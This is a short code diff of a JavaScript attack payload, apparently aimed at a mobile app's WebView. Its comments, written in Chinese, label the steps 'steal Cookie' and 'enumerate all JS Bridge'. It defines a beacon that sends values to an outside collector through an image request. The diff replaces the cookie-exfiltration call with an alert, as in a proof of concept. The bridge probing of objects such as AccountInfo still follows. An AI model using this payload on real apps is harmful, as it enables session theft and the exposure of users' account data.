@@ -5,7 +5,7 @@ new Image().src = B + '/collect?data=' + k + '='
 + encodeURIComponent(String(v || '').substring(0, 2000));
 }
 // 1) 窃取 Cookie
-beacon('COOKIE', document.cookie || '(EMPTY)');
+alert('COOKIE=' + (document.cookie || '(EMPTY)'));
 // 2) 枚举所有 JS Bridge
 ['H5Interface','AccountInfo','ugcH5Interface'].forEach(function(n){
 try {
